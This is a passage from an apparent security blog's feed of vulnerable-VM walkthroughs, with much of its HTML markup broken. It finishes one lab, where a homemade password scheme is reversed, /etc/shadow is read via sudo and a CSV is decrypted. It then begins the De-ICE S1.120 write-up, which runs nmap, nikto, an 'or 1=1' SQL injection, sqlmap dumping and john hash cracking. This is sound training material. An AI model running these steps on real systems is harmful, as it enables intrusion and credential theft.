</span><span class='line'>   <span class="kt">int</span> <span class="n">check</span><span class="o">=(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">)/</span><span class="mi">2</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>   <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">ref</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'>     <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]%</span><span class="n">check</span><span class="o">)+(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);</span>
</span><span class='line'>     <span class="k">else</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);}</span>
</span><span class='line'> <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
</span><span class='line'>
</span><span class='line'> <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopBack</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'>   <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">/</span><span class="mi">2</span><span class="o">;</span>
</span><span class='line'>   <span class="kt">int</span><span class="o">[]</span> <span class="n">encNew</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">+</span><span class="n">ref</span><span class="o">];</span>
</span><span class='line'>   <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span>
</span><span class='line'>   <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="o">);</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>     <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">input</span><span class="o">[</span><span class="n">ch</span><span class="o">];</span> <span class="n">ch</span><span class="o">++;}</span>
</span><span class='line'>     <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">encNew</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'>       <span class="k">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&amp;</span><span class="n">lt</span><span class="o">;=</span><span class="mi">33</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">33</span><span class="o">+(++</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
</span><span class='line'>       <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&amp;</span><span class="n">gt</span><span class="o">;=</span><span class="mi">126</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">126</span><span class="o">-(--</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
</span><span class='line'>       <span class="k">else</span><span class="o">{</span>
</span><span class='line'>         <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]-=(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="o">);</span>
</span><span class='line'>         <span class="k">else</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]+=(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">);}}</span>
</span><span class='line'> <span class="k">return</span> <span class="n">encNew</span><span class="o">;}</span>
</span><span class='line'>
</span><span class='line'> <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopProcess</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>   <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'>     <span class="k">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">41</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
</span><span class='line'>     <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">45</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="o">;}</span>
</span><span class='line'> <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="kt">int</span><span class="o">[]</span> <span class="n">a</span> <span class="o">=</span> <span class="n">processLoop</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
</span><span class='line'>    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="o">;</span><span class="n">a</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span> <span class="n">a</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;}&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">root</span><span class="nd">@kali32</span><span class="o">:~</span><span class="err">#</span> <span class="n">javac</span> <span class="n">test</span><span class="o">.</span><span class="na">java</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We encrypt another usernames to get passwords.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# java test sysadmin
</span><span class='line'>7531/{{tor/rv/A
</span><span class='line'>root@kali32:~# java test root
</span><span class='line'>31/Fwxw+2</span></code></pre></td></tr></table></div></figure></p>

<p>Now we can log as sysadmin. Using sudo:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User sysadmin may run the following commands on this host:
</span><span class='line'>    (root) NOEXEC: /bin/ls
</span><span class='line'>    (root) NOEXEC: /usr/bin/cat
</span><span class='line'>    (root) NOEXEC: /usr/bin/more
</span><span class='line'>    (root) NOEXEC: !/usr/bin/su &lt;em>root&lt;/em></span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sysadmin@slax:~$ sudo cat /etc/shadow
</span><span class='line'>root:$1$vEElgVNe$9nK8G715PgmFE4g1QyTII0:13553:0:::::
</span><span class='line'>bin:&lt;em>:9797:0:::::
</span><span class='line'>daemon:&lt;/em>:9797:0:::::
</span><span class='line'>adm:&lt;em>:9797:0:::::
</span><span class='line'>lp:&lt;/em>:9797:0:::::
</span><span class='line'>sync:&lt;em>:9797:0:::::
</span><span class='line'>shutdown:&lt;/em>:9797:0:::::
</span><span class='line'>halt:&lt;em>:9797:0:::::
</span><span class='line'>mail:&lt;/em>:9797:0:::::
</span><span class='line'>&lt;a href="news:*:9797:0:::::">news:*:9797:0:::::&lt;/a>
</span><span class='line'>uucp:&lt;em>:9797:0:::::
</span><span class='line'>operator:&lt;/em>:9797:0:::::
</span><span class='line'>games:&lt;em>:9797:0:::::
</span><span class='line'>&lt;a href="ftp:*:9797:0:::::">ftp:*:9797:0:::::&lt;/a>
</span><span class='line'>smmsp:&lt;/em>:9797:0:::::
</span><span class='line'>mysql:&lt;em>:9797:0:::::
</span><span class='line'>rpc:&lt;/em>:9797:0:::::
</span><span class='line'>sshd:&lt;em>:9797:0:::::
</span><span class='line'>gdm:&lt;/em>:9797:0:::::
</span><span class='line'>pop:&lt;em>:9797:0:::::
</span><span class='line'>nobody:&lt;/em>:9797:0:::::
</span><span class='line'>sysadmin:$1$Nj4nHA2G$JbByYpmcxsXEiWAUObt1n0:13550:0:99999:7:::
</span><span class='line'>csadmin:$1$fL53QS96$x94h96zABA9MrbISq7VtZ1:13550:0:99999:7:::
</span><span class='line'>sdadmin:$1$hL8T9Cgk$0g4u8UgtkMn11OJ7sjsK00:13550:0:99999:7:::
</span><span class='line'>dbadmin:$1$dQwfzffm$kIXUGVFu3XZmm4jZNp6wa1:13550:0:99999:7:::</span></code></pre></td></tr></table></div></figure></p>

<p>Because we are in wheel group, we can invoke the command &lsquo;su&rsquo; directly to obtain the root access:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sysadmin@slax:~$ id
</span><span class='line'>uid=1000(sysadmin) gid=10(wheel) groups=10(wheel)
</span><span class='line'>sysadmin@slax:~$ su
</span><span class='line'>Password: *********
</span><span class='line'>root@slax:/home/sysadmin#</span></code></pre></td></tr></table></div></figure></p>

<p>From the home directory of sysadmin user, we locate the encrypted file in ftp and use
script for decryption, with the password of the root user:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:~# cat /home/sysadmin/Note_to_self
</span><span class='line'>Note:
</span><span class='line'>useracc_update.csv file has been moved to the ftp server and encrypted
</span><span class='line'>for transfer to dbadmin&rsquo;s account.  These are only the updated values
</span><span class='line'>for reference in the database.&lt;br/>
</span><span class='line'>We need to tailor to our new customers for the New Year!</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/home/ftp/incoming# cat crack-openssl.sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/usr/bin/env bash&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mkdir csv
</span><span class='line'><span class="nv">ciphers</span><span class="o">=</span>&lt;code&gt;openssl list-cipher-commands&lt;/code&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;for c in <span class="nv">$ciphers</span><span class="p">;</span> <span class="k">do</span>
</span><span class='line'>  openssl enc -d -<span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$c</span><span class="p">&amp;</span>rdquo<span class="p">;</span> -in useracc_update.csv.enc -k <span class="p">&amp;</span>ldquo<span class="p">;</span>31/Fwxw+2<span class="p">&amp;</span>rdquo<span class="p">;</span> -out csv/useracc_update.csv.<span class="nv">$c</span>-decrypted 2&gt;/dev/ull
</span><span class='line'><span class="k">done</span>
</span><span class='line'>strings -n <span class="m">12</span> csv/*
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/ftp/incoming# ./crack-openssl.sh &lt;br/>
</span><span class='line'>ID,Last,First,Email,State,Username,Password,Verifacation Code,Pin code
</span><span class='line'>1000,Carr,Alfred,acarr23@gmail.com,NY,acarr9096,phantom4,952733,490
</span><span class='line'>1001,Karson,William,wkarson53@yahoo.com,NY,wkarson2431,rockallday123,567094,345
</span><span class='line'>1002,Wheeler,Cordy,megawheels98@rocketmail.com,NY,cwheeler5031,goeagles90,462724,631
</span><span class='line'>1003,Smith,Ken,synthesizer_1r@gmail.com,NY,ksmith6253,crystalization,636721,353
</span><span class='line'>1004,Quinn,Cynthia,qcq92@aol.com,NY,cquinn1217,archyandhenry,680247,223
</span><span class='line'>1005,Floyd,Wilson,jukeboxer_4life@gmail.com,NY,wfloyd5931,knockout66,521456,441
</span><span class='line'>1006,Blake,Markus,sil3nt_gunn3r@yahoo.com,NY,mblake6947,268768924,129632,557
</span><span class='line'>1007,Nash,Jillian,wiselife141@aol.com,NY,jnash0934,checkitout1,324672,315
</span><span class='line'>1008,Atkins,Alison,double_a44@hotmail.com,NY,aatkins9087,gogogo123123,457094,124
</span><span class='line'>1009,Oliver,Frank,fog_of_war0001@gmail.com,NY,foliver9385,falconpunch,783143,134
</span><span class='line'>1010,Jones,Edith,msjones677@hotmail.com,NY,ejones7532,chris12345,632620,579
</span><span class='line'>1011,Moore,Cody,aiprojectx@gmail.com,NY,dot_Cipher,crypTrace,101010,1337</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DE-ICE-S1.120]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/13/de-ice-s1-dot-120/"/>
    <updated>2015-05-13T15:54:08+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/13/de-ice-s1-dot-120</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1120,10/">De-ICE: S1.120</a></p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE  VERSION
</span><span class='line'>21/tcp   open  ftp      ProFTPD 1.3.2
</span><span class='line'>22/tcp   open  ssh      OpenSSH 5.1 (protocol 2.0)
</span><span class='line'>80/tcp   open  http     Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
</span><span class='line'>443/tcp  open  ssl/http Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
</span><span class='line'>3306/tcp open  mysql    MySQL (unauthorized)
</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)
</span><span class='line'>Service Info: OS: Unix</span></code></pre></td></tr></table></div></figure></p>

<p>Nikto output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 192.168.1.120&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Target IP:          192.168.1.120&lt;/li>
</span><span class='line'>&lt;li>Target Hostname:    192.168.1.120&lt;/li>
</span><span class='line'>&lt;li>Target Port:        80
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Start Time:         2015-05-07 00:29:50 (GMT2)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Server: Apache/2.2.11 (Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0&lt;/li>
</span><span class='line'>&lt;li>Retrieved x-powered-by header: PHP/5.2.9&lt;/li>
</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
</span><span class='line'>&lt;li>Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See &lt;a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15.">http://www.wisec.it/sectou.php?id=4698ebdc59d15.&lt;/a> The following alternatives for &lsquo;index&rsquo; were found: HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var&lt;/li>
</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /favicon.ico, inode: 8430, size: 30894, mtime: Fri May 11 14:40:36 2007&lt;/li>
</span><span class='line'>&lt;li>mod_apreq2-20051231/2.6.0 appears to be outdated (current is at least 2.6.1)&lt;/li>
</span><span class='line'>&lt;li>mod_perl/2.0.4 appears to be outdated (current is at least 2.0.7)&lt;/li>
</span><span class='line'>&lt;li>Apache/2.2.11 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.&lt;/li>
</span><span class='line'>&lt;li>mod_ssl/2.2.11 appears to be outdated (current is at least 2.8.31) (may depend on server version)&lt;/li>
</span><span class='line'>&lt;li>PHP/5.2.9 appears to be outdated (current is at least 5.4.26)&lt;/li>
</span><span class='line'>&lt;li>Perl/v5.10.0 appears to be outdated (current is at least v5.14.2)&lt;/li>
</span><span class='line'>&lt;li>OpenSSL/0.9.8k appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.&lt;/li>
</span><span class='line'>&lt;li>mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.&lt;/li>
</span><span class='line'>&lt;li>Web Server returns a valid response with junk HTTP methods, this may cause false positives.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3268: /webalizer/: Directory indexing found.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /cgi-bin/printenv: Apache 2.0 default script is executable and gives server environment variables. All default scripts should be removed. It may also allow XSS types of attacks. &lt;a href="http://www.securityfocus.com/bid/4431.">http://www.securityfocus.com/bid/4431.&lt;/a>&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /cgi-bin/test-cgi: Apache 2.0 default script is executable and reveals system information. All default scripts should be removed.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3268: /icons/: Directory indexing found.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
</span><span class='line'>&lt;li>/phpmyadmin/: phpMyAdmin directory found&lt;/li>
</span><span class='line'>&lt;li>7354 requests: 0 error(s) and 25 item(s) reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>End Time:           2015-05-07 00:30:03 (GMT2) (13 seconds)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>As we can see, Nikto reveals the installation of phpmyadmin and some minor
vulnerabilities. There is an information about CVE-2002-0082 too, but we didn&rsquo;t
find any exploit for the issue.</p>

<p>We connect to the web page, add a few products and try sql injection:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.1.120/products.php?id=2">http://192.168.1.120/products.php?id=2&lt;/a> or 1=1&ndash;+</span></code></pre></td></tr></table></div></figure></p>

<p>We found out that it works so we try sqlmap to dump the whole database content:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u &ldquo;&lt;a href="http://192.168.1.120/products.php?id=1">http://192.168.1.120/products.php?id=1&lt;/a>&rdquo; -p id &ndash;dump-all</span></code></pre></td></tr></table></div></figure></p>

<p>This gives us the mysql sha1 hashes. After a small formating, we got:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# cat user-f3649c95.csv | cut -d, -f2-3 | sed &rsquo;s#,#:#&lsquo; > hashes.csv
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# john &ndash;format=mysql-sha1 hashes.csv
</span><span class='line'>Loaded 50 password hashes with no different salts (MySQL 4.1 double-SHA-1 [128/128 SSE2 intrinsics 8x])
</span><span class='line'>123456           (bwatkins)
</span><span class='line'>12345            (ktso)
</span><span class='line'>password         (krenfro)
</span><span class='line'>12345678         (amaynard)
</span><span class='line'>abc123           (cchisholm)
</span><span class='line'>computer         (jalvarez)
</span><span class='line'>1234             (dwestling)
</span><span class='line'>qwerty           (tdeleon)
</span><span class='line'>internet         (sgains)
</span><span class='line'>shadow           (jfranklin)
</span><span class='line'>baseball         (kwebber)
</span><span class='line'>letmein          (dstevens)
</span><span class='line'>dragon           (bbanter)
</span><span class='line'>jordan           (mbryan)
</span><span class='line'>michael          (aweiland)
</span><span class='line'>michelle         (hlovell)
</span><span class='line'>trustno1         (rpatel)
</span><span class='line'>soccer           (dgrant)
</span><span class='line'>batman           (aadams)
